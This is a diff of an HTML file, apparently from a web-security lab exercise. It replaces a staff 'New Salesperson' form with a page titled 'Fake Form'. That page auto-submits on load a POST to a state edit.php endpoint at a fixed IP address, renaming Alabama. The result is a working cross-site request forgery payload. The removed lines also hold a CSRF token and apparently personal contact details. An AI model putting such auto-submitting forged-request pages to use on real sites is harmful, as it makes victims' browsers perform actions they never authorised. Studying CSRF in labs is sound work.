@@ -1,40 +1,20 @@
-<!doctype html>
-<html lang="en">
+<html>
   <head>
-    <title>Staff: New Salesperson</title>
-    <meta charset="utf-8">
-    <meta name="description" content="Staff: New Salesperson">
-    <link rel="stylesheet" media="all" href="/red/public/styles.css">
+    <title>Fake Form</title>
   </head>
-  <body>
-<div id="menu">
-  <ul>
-    <li><a href="/red/public/index.php">Public Site</a></li>
-    <li><a href="/red/public/staff/index.php">Staff Menu</a></li>
-    <li><a href="/red/public/staff/logout.php" style="color: red;">Log out</a></li>
-  </ul>
-</div>
-
-<div id="main-content">
-  <a href="index.php">Back to Salespeople List</a><br />
-
-  <h1>New Salesperson</h1>
-
+     <body onload="document.good_form.submit()">
+      <h3> Form to edit Alabama to AlabamaElaaaaaa </h3>
+      <form action="https://35.184.88.145/red/public/staff/states/edit.php?..." name ="good_form" method="POST" >
+      Name:<br />
+      <input type="text" name="name" value="AlabamaElaaaaaa" /><br />
+      Code:<br />
+      <input type="text" name="code" value="AL" /><br />
+      Country ID:<br />
+      <input type="text" name="country_id" value="1" /><br />
+      <br />
+      <input type="submit" " value="Update"  />
+      </form>
+ 
+     </body>
   
-  <form action="new.php" method="post">
-    <input type="hidden" name="csrf_token" value="e325679b64beecc2f512dea80e9e9820" />    First name:<br />
-    <input type="text" name="first_name" value="Elaheh" /><br />
-    Last name:<br />
-    <input type="text" name="last_name" value="Jamali" /><br />
-    Phone:<br />
-    <input type="text" name="phone" value="98980582727" /><br />
-    Email:<br />
-    <input type="text" name="email" value="ela@gmail.com" /><br />
-    <br />
-    <input type="submit" name="submit" value="Create"  />
-  </form>
-
-</div>
-
-  </body>
 </html>
